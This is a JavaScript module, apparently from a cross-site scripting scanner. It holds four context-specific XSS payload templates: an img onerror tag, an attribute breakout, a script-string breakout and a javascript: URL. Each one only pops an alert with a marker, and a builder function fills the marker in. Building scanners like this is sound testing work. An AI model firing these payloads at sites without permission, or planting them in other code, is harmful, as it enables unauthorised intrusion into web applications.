/**
 * Context-specific XSS payloads.
 *
 * Each payload uses {MARKER} as a placeholder for a unique string that
 * the scanner looks for in the response.
 */

const payloads = {
  html: {
    // Injected into HTML body — image with onerror handler
    template: `<img src=x onerror=alert('{MARKER}')>`,
    description: 'HTML body — img onerror handler',
    triggersOnLoad: true,
  },

  attribute: {
    // Injected inside an attribute value — break out and add handler
    template: `" onmouseover="alert('{MARKER}')" x="`,
    description: 'Attribute — break out with event handler',
    triggersOnLoad: false, // needs mouseover — we trigger it via browser
  },

  script: {
    // Injected inside a <script> block — close the string, inject code
    template: `';alert('{MARKER}');//`,
    description: 'Script block — break out with quote and comment',
    triggersOnLoad: true,
  },

  url: {
    // Injected into href/src — use javascript: scheme
    template: `javascript:alert('{MARKER}')`,
    description: 'URL attribute — javascript: scheme',
    triggersOnLoad: false, // needs click — we trigger it via browser
  },
};

/**
 * Build a payload string with a unique marker.
 */
function buildPayload(context, marker) {
  const entry = payloads[context] || payloads.html;
  return {
    payload: entry.template.replace('{MARKER}', marker),
    description: entry.description,
    triggersOnLoad: entry.triggersOnLoad,
    context,
  };
}

module.exports = { payloads, buildPayload };